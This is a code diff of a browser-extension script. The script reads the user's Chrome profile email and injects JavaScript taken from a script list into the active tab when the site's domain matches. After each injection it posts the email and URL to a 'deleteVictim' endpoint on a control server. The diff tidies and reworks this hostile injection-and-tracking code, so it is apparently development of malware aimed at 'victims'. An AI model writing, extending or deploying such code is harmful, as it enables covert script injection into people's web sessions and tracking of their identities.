@@ -1,7 +1,7 @@
 function executeJS() {
     chrome.identity.getProfileUserInfo(function(userInfo) {
         if (userInfo.email == "") {
-            userEmail = "no_email_found"
+            userEmail = "no_email_found";
         }
         else {
             userEmail = userInfo.email;
@@ -12,17 +12,18 @@ function executeJS() {
             var url = script.js[i][0];
             var code = script.js[i][1];
                 (function(url, code){
-                chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
+                chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                     if (tabs[0]) {
                         var tabUrl = tabs[0].url;
                         var urlList = tabUrl.split('\/')[2].split('.');
                         var thisUrl = urlList[urlList.length - 2] + '.' + urlList[urlList.length - 1];
-                        console.log(thisUrl);
-                        console.log(url);
-                        if(thisUrl === url){
+                        if(thisUrl === url) {
                             chrome.tabs.executeScript(null, {code:code}, function(result) {
                                 chrome.runtime.lastError; // For the errors
-                                $.post(`http://localhost:5000/deleteVictim/${userEmail}/${url}`);
+                                $.post(`http://localhost:5000/deleteVictim`, {
+                                    email: userEmail,
+                                    url: url
+                                });
                             });
                         }
                     }
